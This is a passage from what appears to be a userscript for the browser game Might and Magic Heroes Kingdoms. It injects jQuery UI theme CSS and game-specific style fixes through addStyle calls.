GPL Version 2 licenses. * http://jquery.org/license * * http://docs.jquery.com/UI/Dialog#theming */.ui-dialog { position: absolute; padding: .2em; width: 300px; overflow: hidden; }.ui-dialog .ui-dialog-titlebar { padding: .5em 1em .3em; position: relative;  }.ui-dialog .ui-dialog-title { float: left; margin: .1em 16px .2em 0; } .ui-dialog .ui-dialog-titlebar-close { position: absolute; right: .3em; top: 50%; width: 19px; margin: -10px 0 0 0; padding: 1px; height: 18px; }.ui-dialog .ui-dialog-titlebar-close span { display: block; margin: 1px; }.ui-dialog .ui-dialog-titlebar-close:hover, .ui-dialog .ui-dialog-titlebar-close:focus { padding: 0; }.ui-dialog .ui-dialog-content { position: relative; border: 0; padding: .5em 1em; background: none; overflow: auto; zoom: 1; }.ui-dialog .ui-dialog-buttonpane { text-align: left; border-width: 1px 0 0 0; background-image: none; margin: .5em 0 0 0; padding: .3em 1em .5em .4em; }.ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset { float: right; }.ui-dialog .ui-dialog-buttonpane button { margin: .5em .4em .5em 0; cursor: pointer; }.ui-dialog .ui-resizable-se { width: 14px; height: 14px; right: 3px; bottom: 3px; }.ui-draggable .ui-dialog-titlebar { cursor: move; }/* * jQuery UI Slider @VERSION * * Copyright 2010, AUTHORS.txt (http://jqueryui.com/about) * Dual licensed under the MIT or GPL Version 2 licenses. * http://jquery.org/license * * http://docs.jquery.com/UI/Slider#theming */.ui-slider { position: relative; text-align: left; }.ui-slider .ui-slider-handle { position: absolute; z-index: 2; width: 1.2em; height: 1.2em; cursor: default; }.ui-slider .ui-slider-range { position: absolute; z-index: 1; font-size: .7em; display: block; border: 0; background-position: 0 0; }.ui-slider-horizontal { height: .8em; }.ui-slider-horizontal .ui-slider-handle { top: -.3em; margin-left: -.6em; }.ui-slider-horizontal .ui-slider-range { top: 0; height: 100%; }.ui-slider-horizontal .ui-slider-range-min { left: 0; }.ui-slider-horizontal .ui-slider-range-max { right: 0; }.ui-slider-vertical { width: .8em; height: 100px; }.ui-slider-vertical .ui-slider-handle { left: -.3em; margin-left: 0; margin-bottom: -.6em; }.ui-slider-vertical .ui-slider-range { left: 0; width: 100%; }.ui-slider-vertical .ui-slider-range-min { bottom: 0; }.ui-slider-vertical .ui-slider-range-max { top: 0; }/* * jQuery UI Tabs @VERSION * * Copyright 2010, AUTHORS.txt (http://jqueryui.com/about) * Dual licensed under the MIT or GPL Version 2 licenses. * http://jquery.org/license * * http://docs.jquery.com/UI/Tabs#theming */.ui-tabs { position: relative; padding: .2em; zoom: 1; } /* position: relative prevents IE scroll bug (element with position: relative inside container with overflow: auto appear as "fixed") */.ui-tabs .ui-tabs-nav { margin: 0; padding: .2em .2em 0; }.ui-tabs .ui-tabs-nav li { list-style: none; float: left; position: relative; top: 1px; margin: 0 .2em 1px 0; border-bottom: 0 !important; padding: 0; white-space: nowrap; }.ui-tabs .ui-tabs-nav li a { float: left; padding: .5em 1em; text-decoration: none; }.ui-tabs .ui-tabs-nav li.ui-tabs-selected { margin-bottom: 0; padding-bottom: 1px; }.ui-tabs .ui-tabs-nav li.ui-tabs-selected a, .ui-tabs .ui-tabs-nav li.ui-state-disabled a, .ui-tabs .ui-tabs-nav li.ui-state-processing a { cursor: text; }.ui-tabs .ui-tabs-nav li a, .ui-tabs.ui-tabs-collapsible .ui-tabs-nav li.ui-tabs-selected a { cursor: pointer; } /* first selector in group seems obsolete, but required to overcome bug in Opera applying cursor: text overall if defined elsewhere... */.ui-tabs .ui-tabs-panel { display: block; border-width: 0; padding: 1em 1.4em; background: none; }.ui-tabs .ui-tabs-hide { display: none !important; }/* * jQuery UI Datepicker @VERSION * * Copyright 2010, AUTHORS.txt (http://jqueryui.com/about) * Dual licensed under the MIT or GPL Version 2 licenses. * http://jquery.org/license * * http://docs.jquery.com/UI/Datepicker#theming */.ui-datepicker { width: 17em; padding: .2em .2em 0; }.ui-datepicker .ui-datepicker-header { position:relative; padding:.2em 0; }.ui-datepicker .ui-datepicker-prev, .ui-datepicker .ui-datepicker-next { position:absolute; top: 2px; width: 1.8em; height: 1.8em; }.ui-datepicker .ui-datepicker-prev-hover, .ui-datepicker .ui-datepicker-next-hover { top: 1px; }.ui-datepicker .ui-datepicker-prev { left:2px; }.ui-datepicker .ui-datepicker-next { right:2px; }.ui-datepicker .ui-datepicker-prev-hover { left:1px; }.ui-datepicker .ui-datepicker-next-hover { right:1px; }.ui-datepicker .ui-datepicker-prev span, .ui-datepicker .ui-datepicker-next span { display: block; position: absolute; left: 50%; margin-left: -8px; top: 50%; margin-top: -8px;  }.ui-datepicker .ui-datepicker-title { margin: 0 2.3em; line-height: 1.8em; text-align: center; }.ui-datepicker .ui-datepicker-title select { font-size:1em; margin:1px 0; }.ui-datepicker select.ui-datepicker-month-year {width: 100%;}.ui-datepicker select.ui-datepicker-month, .ui-datepicker select.ui-datepicker-year { width: 49%;}.ui-datepicker table {width: 100%; font-size: .9em; border-collapse: collapse; margin:0 0 .4em; }.ui-datepicker th { padding: .7em .3em; text-align: center; font-weight: bold; border: 0;  }.ui-datepicker td { border: 0; padding: 1px; }.ui-datepicker td span, .ui-datepicker td a { display: block; padding: .2em; text-align: right; text-decoration: none; }.ui-datepicker .ui-datepicker-buttonpane { background-image: none; margin: .7em 0 0 0; padding:0 .2em; border-left: 0; border-right: 0; border-bottom: 0; }.ui-datepicker .ui-datepicker-buttonpane button { float: right; margin: .5em .2em .4em; cursor: pointer; padding: .2em .6em .3em .6em; width:auto; overflow:visible; }.ui-datepicker .ui-datepicker-buttonpane button.ui-datepicker-current { float:left; }/* with multiple calendars */.ui-datepicker.ui-datepicker-multi { width:auto; }.ui-datepicker-multi .ui-datepicker-group { float:left; }.ui-datepicker-multi .ui-datepicker-group table { width:95%; margin:0 auto .4em; }.ui-datepicker-multi-2 .ui-datepicker-group { width:50%; }.ui-datepicker-multi-3 .ui-datepicker-group { width:33.3%; }.ui-datepicker-multi-4 .ui-datepicker-group { width:25%; }.ui-datepicker-multi .ui-datepicker-group-last .ui-datepicker-header { border-left-width:0; }.ui-datepicker-multi .ui-datepicker-group-middle .ui-datepicker-header { border-left-width:0; }.ui-datepicker-multi .ui-datepicker-buttonpane { clear:left; }.ui-datepicker-row-break { clear:both; width:100%; }/* RTL support */.ui-datepicker-rtl { direction: rtl; }.ui-datepicker-rtl .ui-datepicker-prev { right: 2px; left: auto; }.ui-datepicker-rtl .ui-datepicker-next { left: 2px; right: auto; }.ui-datepicker-rtl .ui-datepicker-prev:hover { right: 1px; left: auto; }.ui-datepicker-rtl .ui-datepicker-next:hover { left: 1px; right: auto; }.ui-datepicker-rtl .ui-datepicker-buttonpane { clear:right; }.ui-datepicker-rtl .ui-datepicker-buttonpane button { float: left; }.ui-datepicker-rtl .ui-datepicker-buttonpane button.ui-datepicker-current { float:right; }.ui-datepicker-rtl .ui-datepicker-group { float:right; }.ui-datepicker-rtl .ui-datepicker-group-last .ui-datepicker-header { border-right-width:0; border-left-width:1px; }.ui-datepicker-rtl .ui-datepicker-group-middle .ui-datepicker-header { border-right-width:0; border-left-width:1px; }/* IE6 IFRAME FIX (taken from datepicker 1.5.3 */.ui-datepicker-cover {    display: none; /*sorry for IE5*/    display/**/: block; /*sorry for IE5*/    position: absolute; /*must have*/    z-index: -1; /*must have*/    filter: mask(); /*must have*/    top: -4px; /*must have*/    left: -4px; /*must have*/    width: 200px; /*must have*/    height: 200px; /*must have*/}/* * jQuery UI Progressbar @VERSION * * Copyright 2010, AUTHORS.txt (http://jqueryui.com/about) * Dual licensed under the MIT or GPL Version 2 licenses. * http://jquery.org/license * * http://docs.jquery.com/UI/Progressbar#theming */.ui-progressbar { height:2em; text-align: left; }.ui-progressbar .ui-progressbar-value {margin: -1px; height:100%; }');
	
	/* HOMMK FIX */
	addStyle('.discret{color:gray;font-weight:lighter;} #map-center .button .right {background-position: -453px -6px;width: 7px;} #map-center .button {cursor: pointer;}#map-center .button .text {background-position: 0px -450px;text-align: center;width: 55px;} #map-center .button .left {background-position: -460px -6px;width: 7px;}#map-center .button div {float: left;font-weight: bolder;height: 22px;line-height: 22px;background-image: url(http://static5.cdn.ubi.com/u/HOMMK/mightandmagicheroeskingdoms.ubi.com/1.5.0.129-12-MTR/img//css_sprite/Label_Buttons.png);} #map-center .button{margin-right: 5px;cursor: pointer;display: inline-block;vertical-align: -6px;} #map-center input{margin-right: 5px;text-align: center;width: 30px;} #map-center .button{margin-right: 5px;cursor: pointer;display: inline-block;vertical-align: -6px;} #map-center{bottom: -30px;height: 22px;left: 455px;position: absolute;} .battleResultDetailedMessageModelCompleteDetailedViewZone{ width: 600px;} .toolbar_button img{width:13px;height:12px;margin-right:5px;border:0;}');
	
	/* force same text style as HOMMK */
	addStyle('.ui-dialog, .ui-widget, .ui-widget input, .ui-widget select, .ui-widget textarea, .ui-widget button { font-family: arial,verdana,sans-serif !important; font-size: 12px !important; }');
	
	addStyle('.ui-helper-hidden { display: none; }.ui-helper-hidden-accessible { position: absolute; left: -99999999px; }.ui-helper-reset { margin: 0; padding: 0; border: 0; outline: 0; line-height: 1.3; text-decoration: none; font-size: 100%; list-style: none; }.ui-helper-clearfix:after { content: "."; display: block; height: 0; clear: both; visibility: hidden; }.ui-helper-clearfix { display: inline-block; }/* required comment for clearfix to work in Opera \*/* html .ui-helper-clearfix { height:1%; }.ui-helper-clearfix { display:block; }/* end clearfix */.ui-helper-zfix { width: 100%; height: 100%; top: 0; left: 0; position: absolute; opacity: 0; filter:Alpha(Opacity=0); }/* Interaction Cues----------------------------------*/.ui-state-disabled { cursor: default !important; }/* Icons----------------------------------*//* states and images */.ui-icon { display: block; text-indent: -99999px; overflow: hidden; background-repeat: no-repeat; }/* Misc visuals----------------------------------*//* Overlays */.ui-widget-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }/* * jQuery UI CSS Framework @VERSION * * Copyright 2010, AUTHORS.txt (http://jqueryui.com/about) * Dual licensed under the MIT or GPL Version 2 licenses. * http://jquery.org/license * * http://docs.jquery.com/UI/Theming/API * * To view and modify this theme, visit http://jqueryui.com/themeroller/?ffDefault=Segoe%20UI,%20Arial,%20sans-serif&fwDefault=bold&fsDefault=1.1em&cornerRadius=6px&bgColorHeader=333333&bgTextureHeader=12_gloss_wave.png&bgImgOpacityHeader=25&borderColorHeader=333333&fcHeader=ffffff&iconColorHeader=ffffff&bgColorContent=000000&bgTextureContent=05_inset_soft.png&bgImgOpacityContent=25&borderColorContent=666666&fcContent=ffffff&iconColorContent=cccccc&bgColorDefault=555555&bgTextureDefault=02_glass.png&bgImgOpacityDefault=20&borderColorDefault=666666&fcDefault=eeeeee&iconColorDefault=cccccc&bgColorHover=0078a3&bgTextureHover=02_glass.png&bgImgOpacityHover=40&borderColorHover=59b4d4&fcHover=ffffff&iconColorHover=ffffff&bgColorActive=f58400&bgTextureActive=05_inset_soft.png&bgImgOpacityActive=30&borderColorActive=ffaf0f&fcActive=ffffff&iconColorActive=222222&bgColorHighlight=eeeeee&bgTextureHighlight=03_highlight_soft.png&bgImgOpacityHighlight=80&borderColorHighlight=cccccc&fcHighlight=2e7db2&iconColorHighlight=4b8e0b&bgColorError=ffc73d&bgTextureError=02_glass.png&bgImgOpacityError=40&borderColorError=ffb73d&fcError=111111&iconColorError=a83300&bgColorOverlay=5c5c5c&bgTextureOverlay=01_flat.png&bgImgOpacityOverlay=50&opacityOverlay=80&bgColorShadow=cccccc&bgTextureShadow=01_flat.png&bgImgOpacityShadow=30&opacityShadow=60&thicknessShadow=7px&offsetTopShadow=-7px&offsetLeftShadow=-7px&cornerRadiusShadow=8px *//* Component containers----------------------------------*/.ui-widget { font-family: arial,verdana,sans-serif; font-size: 12px; }.ui-widget .ui-widget { font-size: 1em; }.ui-widget input, .ui-widget select, .ui-widget textarea, .ui-widget button { font-family: arial,verdana,sans-serif; font-size: 12px; }.ui-widget-content { border: 1px solid #666666;  background: rgba(0,0,0,0.75); color: #c0c0c0; }.ui-widget-content a { color: #ffffff; }.ui-widget-header { color: #ffffff; font-weight: bold; }.ui-widget-header a { color: #ffffff; }/* Interaction states----------------------------------*/.ui-state-default, .ui-widget-content .ui-state-default, .ui-widget-header .ui-state-default { border: 1px solid #666666; background: #555555 ; font-weight: bold; color: #eeeeee; }.ui-state-default a, .ui-state-default a:link, .ui-state-default a:visited { color: #eeeeee; text-decoration: none; }.ui-state-hover, .ui-widget-content .ui-state-hover, .ui-widget-header .ui-state-hover, .ui-state-focus, .ui-widget-content .ui-state-focus, .ui-widget-header .ui-state-focus { border: 1px solid #59b4d4; background: #0078a3; font-weight: bold; color: #ffffff; }.ui-state-hover a, .ui-state-hover a:hover { color: #ffffff; text-decoration: none; }.ui-state-active, .ui-widget-content .ui-state-active, .ui-widget-header .ui-state-active { border: 1px solid #ffaf0f; background: #f58400; font-weight: bold; color: #ffffff; }.ui-state-active a, .ui-state-active a:link, .ui-state-active a:visited { color: #ffffff; text-decoration: none; }.ui-widget :active { outline: none; }/* Interaction Cues----------------------------------*/.ui-state-highlight, .ui-widget-content .ui-state-highlight, .ui-widget-header .ui-state-highlight  {border: 1px solid #cccccc; background: #eeeeee ; color: #2e7db2; }.ui-state-highlight a, .ui-widget-content .ui-state-highlight a,.ui-widget-header .ui-state-highlight a { color: #2e7db2; }.ui-state-error, .ui-widget-content .ui-state-error, .ui-widget-header .ui-state-error {border: 1px solid #ffb73d; background: #ffc73d ; color: #111111; }.ui-state-error a, .ui-widget-content .ui-state-error a, .ui-widget-header .ui-state-error a { color: #111111; }.ui-state-error-text, .ui-widget-content .ui-state-error-text, .ui-widget-header .ui-state-error-text { color: #111111; }.ui-priority-primary, .ui-widget-content .ui-priority-primary, .ui-widget-header .ui-priority-primary { font-weight: bold; }.ui-priority-secondary, .ui-widget-content .ui-priority-secondary,  .ui-widget-header .ui-priority-secondary { opacity: .7; filter:Alpha(Opacity=70); font-weight: normal; }.ui-state-disabled, .ui-widget-content .ui-state-disabled, .ui-widget-header .ui-state-disabled { opacity: .35; filter:Alpha(Opacity=35); background-image: none; }/* Icons----------------------------------*//* states and images */.ui-icon { width: 16px; height: 16px; background-image: url(http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.4/themes/ui-darkness/images/ui-icons_cccccc_256x240.png); }.ui-widget-content .ui-icon {background-image: url(http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.4/themes/ui-darkness/images/ui-icons_cccccc_256x240.png); }.ui-widget-header .ui-icon {background-image: url(http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.4/themes/ui-darkness/images/ui-icons_ffffff_256x240.png); }.ui-state-default .ui-icon { background-image: url(http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.4/themes/ui-darkness/images/ui-icons_cccccc_256x240.png); }.ui-state-hover .ui-icon, .ui-state-focus .ui-icon {background-image: url(http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.4/themes/ui-darkness/images/ui-icons_ffffff_256x240.png); }.ui-state-active .ui-icon {background-image: url(http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.4/themes/ui-darkness/images/ui-icons_222222_256x240.png); }.ui-state-highlight .ui-icon {background-image: url(http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.4/themes/ui-darkness/images/ui-icons_4b8e0b_256x240.png); }.ui-state-error .ui-icon, .ui-state-error-text .ui-icon {background-image: url(http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.4/themes/ui-darkness/images/ui-icons_a83300_256x240.png); }/* positioning */.ui-icon-carat-1-n { background-position: 0 0; }.ui-icon-carat-1-ne { background-position: -16px 0; }.ui-icon-carat-1-e { background-position: -32px 0; }.ui-icon-carat-1-se { background-position: -48px 0; }.ui-icon-carat-1-s { background-position: -64px 0; }.ui-icon-carat-1-sw { background-position: -80px 0; }.ui-icon-carat-1-w { background-position: -96px 0; }.ui-icon-carat-1-nw { background-position: -112px 0; }.ui-icon-carat-2-n-s { background-position: -128px 0; }.ui-icon-carat-2-e-w { background-position: -144px 0; }.ui-icon-triangle-1-n { background-position: 0 -16px; }.ui-icon-triangle-1-ne { background-position: -16px -16px; }.ui-icon-triangle-1-e { background-position: -32px -16px; }.ui-icon-triangle-1-se { background-position: -48px -16px; }.ui-icon-triangle-1-s { background-position: -64px -16px; }.ui-icon-triangle-1-sw { background-position: -80px -16px; }.ui-icon-triangle-1-w { background-position: -96px -16px; }.ui-icon-triangle-1-nw { background-position: -112px -16px; }.ui-icon-triangle-2-n-s { background-position: -128px -16px; }.ui-icon-triangle-2-e-w { background-position: -144px -16px; }.ui-icon-arrow-1-n { background-position: 0 -32px; }.ui-icon-arrow-1-ne { background-position: -16px -32px; }.ui-icon-arrow-1-e { background-position: -32px -32px; }.ui-icon-arrow-1-se { background-position: -48px -32px; }.ui-icon-arrow-1-s { background-position: -64px -32px; }.ui-icon-arrow-1-sw { background-position: -80px -32px; }.ui-icon-arrow-1-w { background-position: -96px -32px; }.ui-icon-arrow-1-nw { background-position: -112px -32px; }.ui-icon-arrow-2-n-s { background-position: -128px -32px; }.ui-icon-arrow-2-ne-sw { background-position: -144px -32px; }.ui-icon-arrow-2-e-w { background-position: -160px -32px; }.ui-icon-arrow-2-se-nw { background-position: -176px -32px; }.ui-icon-arrowstop-1-n { background-position: -192px -32px; }.ui-icon-arrowstop-1-e { background-position: -208px -32px; }.ui-icon-arrowstop-1-s { background-position: -224px -32px; }.ui-icon-arrowstop-1-w { background-position: -240px -32px; }.ui-icon-arrowthick-1-n { background-position: 0 -48px; }.ui-icon-arrowthick-1-ne { background-position: -16px -48px; }.ui-icon-arrowthick-1-e { background-position: -32px -48px; }.ui-icon-arrowthick-1-se { background-position: -48px -48px; }.ui-icon-arrowthick-1-s { background-position: -64px -48px; }.ui-icon-arrowthick-1-sw { background-position: -80px -48px; }.ui-icon-arrowthick-1-w { background-position: -96px -48px; }.ui-icon-arrowthick-1-nw { background-position: -112px -48px; }.ui-icon-arrowthick-2-n-s { background-position: -128px -48px; }.ui-icon-arrowthick-2-ne-sw { background-position: -144px -48px; }.ui-icon-arrowthick-2-e-w { background-position: -160px -48px; }.ui-icon-arrowthick-2-se-nw { background-position: -176px -48px; }.ui-icon-arrowthickstop-1-n { background-position: -192px -48px; }.ui-icon-arrowthickstop-1-e { background-position: -208px -48px; }.ui-icon-arrowthickstop-1-s { background-position: -224px -48px; }.ui-icon-arrowthickstop-1-w { background-position: -240px -48px; }.ui-icon-arrowreturnthick-1-w { background-position: 0 -64px; }.ui-icon-arrowreturnthick-1-n { background-position: -16px -64px; }.ui-icon-arrowreturnthick-1-e { background-position: -32px -64px; }.ui-icon-arrowreturnthick-1-s { background-position: -48px -64px; }.ui-icon-arrowreturn-1-w { background-position: -64px -64px; }.ui-icon-arrowreturn-1-n { background-position: -80px -64px; }.ui-icon-arrowreturn-1-e { background-position: -96px -64px; }.ui-icon-arrowreturn-1-s { background-position: -112px -64px; }.ui-icon-arrowrefresh-1-w { background-position: -128px -64px; }.ui-icon-arrowrefresh-1-n { background-position: -144px -64px; }.ui-icon-arrowrefresh-1-e { background-position: -160px -64px; }.ui-icon-arrowrefresh-1-s { background-position: -176px -64px; }.ui-icon-arrow-4 { background-position: 0 -80px; }.ui-icon-arrow-4-diag { background-position: -16px -80px; }.ui-icon-extlink { background-position: -32px -80px; }.ui-icon-newwin { background-position: -48px -80px; }.ui-icon-refresh { background-position: -64px -80px; }.ui-icon-shuffle { background-position: -80px -80px; }.ui-icon-transfer-e-w { background-position: -96px -80px; }.ui-icon-transferthick-e-w { background-position: -112px -80px; }.ui-icon-folder-collapsed { background-position: 0 -96px; }.ui-icon-folder-open { background-position: -16px -96px; }.ui-icon-document { background-position: -32px -96px; }.ui-icon-document-b { background-position: -48px -96px; }.ui-icon-note { background-position: -64px -96px; }.ui-icon-mail-closed { background-position: -80px -96px; }.ui-icon-mail-open { background-position: -96px -96px; }.ui-icon-suitcase { background-position: -112px -96px; }.ui-icon-comment { background-position: -128px -96px; }.ui-icon-person { background-position: -144px -96px; }.ui-icon-print { background-position: -160px -96px; }.ui-icon-trash { background-position: -176px -96px; }.ui-icon-locked { background-position: -192px -96px; }.ui-icon-unlocked { background-position: -208px -96px; }.ui-icon-bookmark { background-position: -224px -96px; }.ui-icon-tag { background-position: -240px -96px; }.ui-icon-home { background-position: 0 -112px; }.ui-icon-flag { background-position: -16px -112px; }.ui-icon-calendar { background-position: -32px -112px; }.ui-icon-cart { background-position: -48px -112px; }.ui-icon-pencil { background-position: -64px -112px; }.ui-icon-clock { background-position: -80px -112px; }.ui-icon-disk { background-position: -96px -112px; }.ui-icon-calculator { background-position: -112px -112px; }.ui-icon-zoomin { background-position: -128px -112px; }.ui-icon-zoomout { background-position: -144px -112px; }.ui-icon-search { background-position: -160px -112px; }.ui-icon-wrench { background-position: -176px -112px; }.ui-icon-gear { background-position: -192px -112px; }.ui-icon-heart { background-position: -208px -112px; }.ui-icon-star { background-position: -224px -112px; }.ui-icon-link { background-position: -240px -112px; }.ui-icon-cancel { background-position: 0 -128px; }.ui-icon-plus { background-position: -16px -128px; }.ui-icon-plusthick { background-position: -32px -128px; }.ui-icon-minus { background-position: -48px -128px; }.ui-icon-minusthick { background-position: -64px -128px; }.ui-icon-close { background-position: -80px -128px; }.ui-icon-closethick { background-position: -96px -128px; }.ui-icon-key { background-position: -112px -128px; }.ui-icon-lightbulb { background-position: -128px -128px; }.ui-icon-scissors { background-position: -144px -128px; }.ui-icon-clipboard { background-position: -160px -128px; }.ui-icon-copy { background-position: -176px -128px; }.ui-icon-contact { background-position: -192px -128px; }.ui-icon-image { background-position: -208px -128px; }.ui-icon-video { background-position: -224px -128px; }.ui-icon-script { background-position: -240px -128px; }.ui-icon-alert { background-position: 0 -144px; }.ui-icon-info { background-position: -16px -144px; }.ui-icon-notice { background-position: -32px -144px; }.ui-icon-help { background-position: -48px -144px; }.ui-icon-check { background-position: -64px -144px; }.ui-icon-bullet { background-position: -80px -144px; }.ui-icon-radio-off { background-position: -96px -144px; }.ui-icon-radio-on { background-position: -112px -144px; }.ui-icon-pin-w { background-position: -128px -144px; }.ui-icon-pin-s { background-position: -144px -144px; }.ui-icon-play { background-position: 0 -160px; }.ui-icon-pause { background-position: -16px -160px; }.ui-icon-seek-next { background-position: -32px -160px; }.ui-icon-seek-prev { background-position: -48px -160px; }.ui-icon-seek-end { background-position: -64px -160px; }.ui-icon-seek-start { background-position: -80px -160px; }/* ui-icon-seek-first is deprecated, use ui-icon-seek-start instead */.ui-icon-seek-first { background-position: -80px -160px; }.ui-icon-stop { background-position: -96px -160px; }.ui-icon-eject { background-position: -112px -160px; }.ui-icon-volume-off { background-position: -128px -160px; }.ui-icon-volume-on { background-position: -144px -160px; }.ui-icon-power { background-position: 0 -176px; }.ui-icon-signal-diag { background-position: -16px -176px; }.ui-icon-signal { background-position: -32px -176px; }.ui-icon-battery-0 { background-position: -48px -176px; }.ui-icon-battery-1 { background-position: -64px -176px; }.ui-icon-battery-2 { background-position: -80px -176px; }.ui-icon-battery-3 { background-position: -96px -176px; }.ui-icon-circle-plus { background-position: 0 -192px; }.ui-icon-circle-minus { background-position: -16px -192px; }.ui-icon-circle-close { background-position: -32px -192px; }.ui-icon-circle-triangle-e { background-position: -48px -192px; }.ui-icon-circle-triangle-s { background-position: -64px -192px; }.ui-icon-circle-triangle-w { background-position: -80px -192px; }.ui-icon-circle-triangle-n { background-position: -96px -192px; }.ui-icon-circle-arrow-e { background-position: -112px -192px; }.ui-icon-circle-arrow-s { background-position: -128px -192px; }.ui-icon-circle-arrow-w { background-position: -144px -192px; }.ui-icon-circle-arrow-n { background-position: -160px -192px; }.ui-icon-circle-zoomin { background-position: -176px -192px; }.ui-icon-circle-zoomout { background-position: -192px -192px; }.ui-icon-circle-check { background-position: -208px -192px; }.ui-icon-circlesmall-plus { background-position: 0 -208px; }.ui-icon-circlesmall-minus { background-position: -16px -208px; }.ui-icon-circlesmall-close { background-position: -32px -208px; }.ui-icon-squaresmall-plus { background-position: -48px -208px; }.ui-icon-squaresmall-minus { background-position: -64px -208px; }.ui-icon-squaresmall-close { background-position: -80px -208px; }.ui-icon-grip-dotted-vertical { background-position: 0 -224px; }.ui-icon-grip-dotted-horizontal { background-position: -16px -224px; }.ui-icon-grip-solid-vertical { background-position: -32px -224px; }.ui-icon-grip-solid-horizontal { background-position: -48px -224px; }.ui-icon-gripsmall-diagonal-se { background-position: -64px -224px; }.ui-icon-grip-diagonal-se { background-position: -80px -224px; }/* Misc visuals----------------------------------*//* Corner radius */.ui-corner-tl { -moz-border-radius-topleft: 6px; -webkit-border-top-left-radius: 6px; border-top-left-radius: 6px; }.ui-corner-tr { -moz-border-radius-topright: 6px; -webkit-border-top-right-radius: 6px; border-top-right-radius: 6px; }.ui-corner-bl { -moz-border-radius-bottomleft: 6px; -webkit-border-bottom-left-radius: 6px; border-bottom-left-radius: 6px; }.ui-corner-br { -moz-border-radius-bottomright: 6px; -webkit-border-bottom-right-radius: 6px; border-bottom-right-radius: 6px; }.ui-corner-top { -moz-border-radius-topleft: 6px; -webkit-border-top-left-radius: 6px; border-top-left-radius: 6px; -moz-border-radius-topright: 6px; -webkit-border-top-right-radius: 6px; border-top-right-radius: 6px; }.ui-corner-bottom { -moz-border-radius-bottomleft: 6px; -webkit-border-bottom-left-radius: 6px; border-bottom-left-radius: 6px; -moz-border-radius-bottomright: 6px; -webkit-border-bottom-right-radius: 6px; border-bottom-right-radius: 6px; }.ui-corner-right {  -moz-border-radius-topright: 6px; -webkit-border-top-right-radius: 6px; border-top-right-radius: 6px; -moz-border-radius-bottomright: 6px; -webkit-border-bottom-right-radius: 6px; border-bottom-right-radius: 6px; }.ui-corner-left { -moz-border-radius-topleft: 6px; -webkit-border-top-left-radius: 6px; border-top-left-radius: 6px; -moz-border-radius-bottomleft: 6px; -webkit-border-bottom-left-radius: 6px; border-bottom-left-radius: 6px; }.ui-corner-all { -moz-border-radius: 6px; -webkit-border-radius: 6px; border-radius: 6px; }/* Overlays */.ui-widget-overlay { background: #5c5c5c url(http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.4/themes/ui-darkness/images/ui-bg_flat_50_5c5c5c_40x100.png) 50% 50% repeat-x; opacity: .80;filter:Alpha(Opacity=80); }.ui-widget-shadow { margin: -7px 0 0 -7px; padding: 7px; background: #cccccc url(http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.4/themes/ui-darkness/images/ui-bg_flat_30_cccccc_40x100.png) 50% 50% repeat-x; opacity: .60;filter:Alpha(Opacity=60); -moz-border-radius: 8px; -webkit-border-radius: 8px; border-radius: 8px; }/* * jQuery UI Resizable @VERSION * * Copyright 2010, AUTHORS.txt (http://jqueryui.com/about) * Dual licensed under the MIT or GPL Version 2 licenses. * http://jquery.org/license * * http://docs.jquery.com/UI/Resizable#theming */.ui-resizable { position: relative;}.ui-resizable-handle { position: absolute;font-size: 0.1px;z-index: 99999; display: block;}.ui-resizable-disabled .ui-resizable-handle, .ui-resizable-autohide .ui-resizable-handle { display: none; }.ui-resizable-n { cursor: n-resize; height: 7px; width: 100%; top: -5px; left: 0; }.ui-resizable-s { cursor: s-resize; height: 7px; width: 100%; bottom: -5px; left: 0; }.ui-resizable-e { cursor: e-resize; width: 7px; right: -5px; top: 0; height: 100%; }.ui-resizable-w { cursor: w-resize; width: 7px; left: -5px; top: 0; height: 100%; }.ui-resizable-se { cursor: se-resize; width: 12px; height: 12px; right: 1px; bottom: 1px; }.ui-resizable-sw { cursor: sw-resize; width: 9px; height: 9px; left: -5px; bottom: -5px; }.ui-resizable-nw { cursor: nw-resize; width: 9px; height: 9px; left: -5px; top: -5px; }.ui-resizable-ne { cursor: ne-resize; width: 9px; height: 9px; right: -5px; top: -5px;}/* * jQuery UI Selectable @VERSION * * Copyright 2010, AUTHORS.txt (http://jqueryui.com/about) * Dual licensed under the MIT or GPL Version 2 licenses. * http://jquery.org/license * * http://docs.jquery.com/UI/Selectable#theming */.ui-selectable-helper { position: absolute; z-index: 100; border:1px dotted black; }/* * jQuery UI Accordion @VERSION * * Copyright 2010, AUTHORS.txt (http://jqueryui.com/about) * Dual licensed under the MIT or GPL Version 2 licenses. * http://jquery.org/license * * http://docs.jquery.com/UI/Accordion#theming *//* IE/Win - Fix animation bug - #4615 */.ui-accordion { width: 100%; }.ui-accordion .ui-accordion-header { cursor: pointer; position: relative; margin-top: 1px; zoom: 1; }.ui-accordion .ui-accordion-li-fix { display: inline; }.ui-accordion .ui-accordion-header-active { border-bottom: 0 !important; }.ui-accordion .ui-accordion-header a { display: block; font-size: 1em; padding: .5em .5em .5em .7em; }.ui-accordion-icons .ui-accordion-header a { padding-left: 2.2em; }.ui-accordion .ui-accordion-header .ui-icon { position: absolute; left: .5em; top: 50%; margin-top: -8px; }.ui-accordion .ui-accordion-content { padding: 1em 2.2em; border-top: 0; margin-top: -2px; position: relative; top: 1px; margin-bottom: 2px; overflow: auto; display: none; zoom: 1; }.ui-accordion .ui-accordion-content-active { display: block; }/* * jQuery UI Autocomplete @VERSION * * Copyright 2010, AUTHORS.txt (http://jqueryui.com/about) * Dual licensed under the MIT or GPL Version 2 licenses. * http://jquery.org/license * * http://docs.jquery.com/UI/Autocomplete#theming */.ui-autocomplete { position: absolute; cursor: default; }	/* workarounds */* html .ui-autocomplete { width:1px; } /* without this, the menu expands to 100% in IE6 *//* * jQuery UI Menu @VERSION * * Copyright 2010, AUTHORS.txt (http://jqueryui.com/about) * Dual licensed under the MIT or GPL Version 2 licenses. * http://jquery.org/license * * http://docs.jquery.com/UI/Menu#theming */.ui-menu {	list-style:none;	padding: 2px;	margin: 0;	display:block;	float: left;}.ui-menu .ui-menu {	margin-top: -3px;}.ui-menu .ui-menu-item {	margin:0;	